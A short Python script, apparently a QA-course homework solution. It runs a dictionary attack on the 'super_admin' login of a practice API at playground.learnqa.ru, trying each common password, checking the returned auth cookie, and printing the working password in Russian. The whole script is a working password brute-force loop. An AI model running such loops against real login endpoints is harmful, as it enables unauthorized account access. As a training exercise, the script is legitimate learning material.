import requests
from old.get_password_from_wiki import get_password_list

password_list = get_password_list()
get_password_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


def payload_get_password(password):
    request_payload = {"login":"super_admin", "password":password}
    return request_payload


for i in password_list:
    response_get_password = requests.post(get_password_url, data=payload_get_password(i))
    auth_cookie = dict(response_get_password.cookies)
    response_check_cookie = requests.post(check_auth_cookie_url, cookies=auth_cookie)
    if response_check_cookie.text == "You are NOT authorized":
        pass
    else:
        answer = response_check_cookie.text
        print(f"Правильный пароль от учетной записи {i}\nПри верном значении пароля метод check_auth_cookie возвращает фразу {answer}")

